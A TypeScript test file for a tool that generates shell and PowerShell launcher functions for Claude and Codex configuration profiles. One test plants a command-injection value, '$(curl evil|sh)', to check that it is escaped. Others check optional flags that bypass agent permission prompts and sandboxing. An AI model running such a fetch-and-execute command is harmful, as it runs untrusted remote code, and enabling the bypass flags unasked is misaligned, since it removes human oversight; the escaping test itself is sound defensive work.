import { describe, it, expect } from 'vitest'
import { renderRcBlock, upsertManagedBlock, BEGIN_MARK, END_MARK } from '../src/rcblock.js'
import { detectPlatform } from '../src/platform.js'
import type { Manifest } from '../src/manifest.js'

const m: Manifest = {
  version: 1, hub: null,
  profiles: [
    { name: 'default', dir: '{home}/.claude', launcher: null, auth: 'oauth', env: {}, settingsEnv: {}, skipPermissions: false, sharedSessions: false, links: {}, mcp: [], plugins: [] },
    { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env',
      env: { ANTHROPIC_AUTH_TOKEN: 'secret://z-token', ANTHROPIC_BASE_URL: 'https://api.z.ai/api/anthropic' },
      settingsEnv: {}, skipPermissions: false, sharedSessions: false, links: {}, mcp: [], plugins: [] },
  ],
  mcpServers: {},
  marketplaces: {},
}
const mac = detectPlatform({ osKind: 'darwin', home: '/Users/x', shell: '/bin/zsh' })
const win = detectPlatform({ osKind: 'win32', home: 'C:\\Users\\x' })

describe('renderRcBlock', () => {
  it('renders posix launchers with secret indirection, skips null launchers', () => {
    const block = renderRcBlock(m, mac)
    expect(block).toContain(BEGIN_MARK)
    expect(block).toContain('cl-z() {')
    expect(block).toContain('export ANTHROPIC_AUTH_TOKEN="$(ccprofiles secrets get z-token)"')
    expect(block).toContain('export ANTHROPIC_BASE_URL="https://api.z.ai/api/anthropic"')
    expect(block).toContain('CLAUDE_CONFIG_DIR="$HOME/.claude-z" claude "$@"')
    expect(block).not.toContain('cl-default')
    expect(block).toContain(END_MARK)
  })
  it('renders powershell launchers on win32', () => {
    const block = renderRcBlock(m, win)
    expect(block).toContain('function cl-z {')
    expect(block).toContain('$env:ANTHROPIC_AUTH_TOKEN = (ccprofiles secrets get z-token)')
    expect(block).toContain('$env:CLAUDE_CONFIG_DIR = "$env:USERPROFILE\\.claude-z"')
    expect(block).toContain('claude @args')
  })

  it('escapes shell metacharacters in free-form env values (defense in depth)', () => {
    const evil: Manifest = {
      version: 1, hub: null,
      profiles: [{ name: 'x', dir: '{home}/.claude-x', launcher: 'cl-x', auth: 'env',
        env: { BASE: 'http://h/$(curl evil|sh)`x`"end' }, settingsEnv: {}, skipPermissions: false, sharedSessions: false, links: {}, mcp: [], plugins: [] }],
      mcpServers: {},
      marketplaces: {},
    }
    const posix = renderRcBlock(evil, mac)
    expect(posix).toContain('export BASE="http://h/\\$(curl evil|sh)\\`x\\`\\"end"')
    expect(posix).not.toContain('"$(curl evil|sh)"') // the dangerous unescaped form must not appear
    const pwsh = renderRcBlock(evil, win)
    expect(pwsh).toContain('`$(curl evil|sh)')
    expect(pwsh).toContain('`"end')
  })

  it('renders --dangerously-skip-permissions before args when skipPermissions is set (posix)', () => {
    const m: Manifest = { version: 1, hub: null, mcpServers: {}, marketplaces: {}, profiles: [
      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false, plugins: [] },
    ] }
    const block = renderRcBlock(m, mac)
    expect(block).toContain('claude --dangerously-skip-permissions "$@"')
  })

  it('omits the flag when skipPermissions is false (posix)', () => {
    const m: Manifest = { version: 1, hub: null, mcpServers: {}, marketplaces: {}, profiles: [
      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: false, sharedSessions: false, plugins: [] },
    ] }
    const block = renderRcBlock(m, mac)
    expect(block).toContain('claude "$@"')
    expect(block).not.toContain('--dangerously-skip-permissions')
  })

  it('renders the flag for pwsh (win32)', () => {
    const m: Manifest = { version: 1, hub: null, mcpServers: {}, marketplaces: {}, profiles: [
      { name: 'z', dir: '{home}/.claude-z', launcher: 'cl-z', auth: 'env', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false, plugins: [] },
    ] }
    const block = renderRcBlock(m, win)
    expect(block).toContain('claude --dangerously-skip-permissions @args')
  })
  it('renders Codex launchers with CODEX_HOME and Codex bypass flag', () => {
    const codex: Manifest = { version: 1, hub: null, mcpServers: {}, marketplaces: {}, profiles: [
      { agent: 'codex', name: 'codex-work', dir: '{home}/.codex-work', launcher: 'cx-work', auth: 'oauth', env: {}, links: {}, mcp: [], settingsEnv: {}, skipPermissions: true, sharedSessions: false, plugins: [] },
    ] }
    const block = renderRcBlock(codex, mac)
    expect(block).toContain('CODEX_HOME="$HOME/.codex-work" codex --dangerously-bypass-approvals-and-sandbox "$@"')
  })
})

function manifestWith(agent: 'claude' | 'codex'): Manifest {
  return {
    version: 1, hub: null, mcpServers: {}, marketplaces: {},
    profiles: [{
      agent, name: agent === 'codex' ? 'codex-work' : 'oauth',
      dir: agent === 'codex' ? '{home}/.codex-work' : '{home}/.claude-oauth',
      launcher: agent === 'codex' ? 'cx-work' : 'cl-oauth',
      auth: 'oauth', env: {}, links: {}, mcp: [], settingsEnv: {},
      skipPermissions: false, sharedSessions: false, plugins: [],
    }],
  }
}

describe('handoff intercept in launchers', () => {
  it('posix launcher intercepts handoff before env, bound to the profile name', () => {
    const p = detectPlatform({ osKind: 'darwin', home: '/home/u', shell: '/bin/zsh' })
    const block = renderRcBlock(manifestWith('claude'), p)
    expect(block).toContain('cl-oauth() {')
    expect(block).toContain('if [ "$1" = handoff ]; then shift; command ccprofiles handoff --from oauth --to "$1"; return; fi')
    // guard precedes the launch line
    expect(block.indexOf('handoff --from oauth')).toBeLessThan(block.indexOf('CLAUDE_CONFIG_DIR='))
  })
  it('codex launcher gets a handoff intercept too', () => {
    const p = detectPlatform({ osKind: 'darwin', home: '/home/u', shell: '/bin/zsh' })
    const block = renderRcBlock(manifestWith('codex'), p)
    expect(block).toContain('command ccprofiles handoff --from codex-work --to "$1"')
  })
  it('powershell launcher intercepts handoff', () => {
    const p = detectPlatform({ osKind: 'win32', home: 'C:/Users/u', shell: 'pwsh' })
    const block = renderRcBlock(manifestWith('claude'), p)
    expect(block).toContain("if ($args[0] -eq 'handoff') { ccprofiles handoff --from oauth --to $args[1]; return }")
  })
})

describe('upsertManagedBlock', () => {
  it('appends when absent', () => {
    const out = upsertManagedBlock('export PATH=/x\n', `${BEGIN_MARK}\nX\n${END_MARK}`)
    expect(out).toBe(`export PATH=/x\n\n${BEGIN_MARK}\nX\n${END_MARK}\n`)
  })
  it('replaces in place when present, preserving surroundings', () => {
    const existing = `before\n${BEGIN_MARK}\nOLD\n${END_MARK}\nafter\n`
    const out = upsertManagedBlock(existing, `${BEGIN_MARK}\nNEW\n${END_MARK}`)
    expect(out).toBe(`before\n${BEGIN_MARK}\nNEW\n${END_MARK}\nafter\n`)
  })
})
